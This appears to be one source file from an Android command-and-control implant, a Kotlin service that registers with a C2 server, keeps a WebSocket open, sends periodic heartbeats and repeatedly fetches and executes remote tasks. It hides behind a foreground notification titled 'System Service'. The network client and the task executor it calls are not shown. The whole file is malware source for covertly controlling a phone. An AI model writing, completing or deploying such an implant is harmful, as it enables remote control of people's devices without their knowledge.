package com.redchain.agent.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.redchain.agent.R
import com.redchain.agent.network.C2Client
import com.redchain.agent.worker.TaskExecutor
import kotlinx.coroutines.*

class C2Service : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var c2Client: C2Client
    private lateinit var taskExecutor: TaskExecutor

    override fun onCreate() {
        super.onCreate()

        c2Client = C2Client(this)
        taskExecutor = TaskExecutor(this, c2Client)

        // Start foreground notification
        startForeground(1, createNotification())

        // Start operations
        serviceScope.launch {
            // Register with C2 if not registered
            if (!c2Client.isRegistered(this@C2Service)) {
                c2Client.register()
            }

            // Connect to WebSocket
            c2Client.connectWebSocket()

            // Start heartbeat
            startHeartbeat()

            // Poll for tasks
            startTaskPolling()
        }
    }

    private suspend fun startHeartbeat() {
        while (isActive) {
            try {
                c2Client.sendHeartbeat()
            } catch (e: Exception) {
                e.printStackTrace()
            }
            delay(30000) // 30 seconds
        }
    }

    private suspend fun startTaskPolling() {
        while (isActive) {
            try {
                val tasks = c2Client.getPendingTasks()
                for (task in tasks) {
                    taskExecutor.executeTask(task)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
            delay(10000) // 10 seconds
        }
    }

    private fun createNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "c2_service",
                "Background Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, "c2_service")
            .setContentTitle("System Service")
            .setContentText("Running in background")
            .setSmallIcon(R.drawable.ic_notification)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        c2Client.disconnect()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
